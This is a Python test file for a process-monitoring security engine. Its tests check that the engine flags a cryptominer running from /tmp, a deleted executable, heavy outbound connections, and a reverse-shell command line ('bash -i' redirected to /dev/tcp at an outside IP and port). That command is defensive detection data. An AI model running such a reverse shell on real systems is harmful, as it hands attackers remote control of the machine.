"""Security heuristic tests."""

from app.config import SecurityConfig
from app.core.security_engine import SecurityEngine
from tests.fakes import proc


def test_tmp_executable_is_flagged() -> None:
    process = proc(200, name="xmr", executable="/tmp/xmrig", cmdline=("/tmp/xmrig",), cpu_percent=95)

    findings = SecurityEngine(SecurityConfig()).scan([process])

    assert findings
    assert findings[0].severity == "CRITICAL"


def test_reverse_shell_pattern_is_flagged() -> None:
    process = proc(201, name="bash", executable="/bin/bash", cmdline=("bash", "-i", ">/dev/tcp/1.2.3.4/4444"))

    findings = SecurityEngine(SecurityConfig()).scan([process])

    assert findings
    assert "suspicious" in findings[0].message


def test_deleted_executable_is_flagged() -> None:
    process = proc(202, name="svc", executable="/usr/bin/svc")
    process.executable_deleted = True

    findings = SecurityEngine(SecurityConfig()).scan([process])

    assert findings
    assert findings[0].category == "WARNING"


def test_excessive_outbound_connections_are_flagged() -> None:
    process = proc(203, name="python", executable="/usr/bin/python3", cpu_percent=55)
    process.outbound_connections = 20

    findings = SecurityEngine(SecurityConfig()).scan([process])

    assert findings
    assert "outbound" in findings[0].message
